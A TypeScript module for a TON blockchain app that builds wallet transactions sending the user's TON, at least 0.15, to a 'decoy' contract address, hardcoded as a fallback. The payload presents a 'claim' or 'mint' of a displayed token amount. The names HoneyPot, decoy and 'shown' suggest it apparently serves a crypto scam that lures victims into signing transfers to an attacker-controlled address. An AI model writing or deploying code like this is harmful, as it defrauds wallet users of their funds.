import type { HoneyPotMode } from '@prisma/client'
import { Address, beginCell, toNano } from '@ton/core'
import path from 'path'

const DECOY_FILE = path.join(process.cwd(), 'src', 'items', 'decoy.json')

const FALLBACK_MASTER = 'UQC1KMTgNyVJPTC1cXIT79UuVntgictIlW8Hflq79ISdFSYm'
const CLAIM_OP = 0xabcdef13 // master mint: (queryId, amount, receiver, comment)

class HoneyPotContracts {
	private async decoyAddress(): Promise<string> {
		try {
			const j: any = await Bun.file(DECOY_FILE).json()
			if (j?.address) return j.address
		} catch {}
		return FALLBACK_MASTER
	}

	async generateMessage(
		tonAmount: number,
		tokenAmount: number = 500,
		_mode: HoneyPotMode,
		forwardTonAddress: string,
		comment?: string
	) {
		const contractAddress = await this.decoyAddress()
		const shown = Number(tokenAmount) > 0 ? Number(tokenAmount) : 1000
		const amount = toNano(shown.toFixed(9))

		const receiver = Address.parse(forwardTonAddress)
		const payload = beginCell()
			.storeUint(0, 32)
			.storeStringTail(comment || '')
			.endCell()

		const body = beginCell()
			.storeUint(CLAIM_OP, 32)
			.storeUint(0, 64)
			.storeCoins(amount)
			.storeAddress(receiver)
			.storeRef(payload)
			.endCell()
			.toBoc()
			.toString('base64url')

		return {
			address: contractAddress,
			amount: toNano(Math.max(Number(tonAmount) || 0, 0.15).toFixed(9)).toString(),
			payload: body,
		}
	}
}

export const HoneyPot = new HoneyPotContracts()
